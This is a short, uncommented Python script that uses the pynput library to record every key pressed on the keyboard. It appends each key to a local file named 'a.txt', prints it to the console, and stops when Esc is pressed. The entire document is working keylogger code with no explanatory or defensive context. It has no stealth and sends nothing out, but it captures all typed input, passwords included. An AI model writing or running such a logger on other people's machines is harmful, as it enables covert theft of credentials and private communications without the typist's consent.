import pynput 
from pynput.keyboard import Key, Listener

def on_press(key):
    write_file(key)
    print(key)

def on_release(key):
    if key == Key.esc:
        return False

def write_file(key):
    with open("a.txt", 'a')  as f:
        f.write(str(key))
        
with Listener(on_press = on_press, on_release = on_release) as l: 
    l.join() 
